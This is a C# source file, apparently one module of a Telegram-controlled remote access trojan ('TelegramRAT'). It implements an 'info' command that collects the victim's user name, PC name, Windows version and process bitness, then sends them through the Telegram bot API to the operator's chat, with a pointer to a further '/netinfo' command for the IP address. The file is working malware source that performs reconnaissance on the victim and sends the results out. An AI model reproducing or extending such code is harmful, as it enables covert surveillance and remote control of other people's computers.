using Telegram.Bot;
using TelegramRAT.Services;
using TelegramRAT.Utilities;

namespace TelegramRAT.Commands.System;

public class InfoCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IWinApiService winApiService) : AbstractBotCommand
{
    public override string Command => "info";
    public override string Description => "Get info about environment and this program process";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            string systemInfoString =
            $"User name: {Environment.UserName}\n" +
            $"PC name: {Environment.MachineName}\n\n" +
            $"OS: {winApiService.GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
            $"NT version: {Environment.OSVersion.Version}\n" +
            $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n\n" +
            $"To get ip address and other network info type /netinfo";

            await botClient.SendMessage(model.Message.Chat.Id, systemInfoString, replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
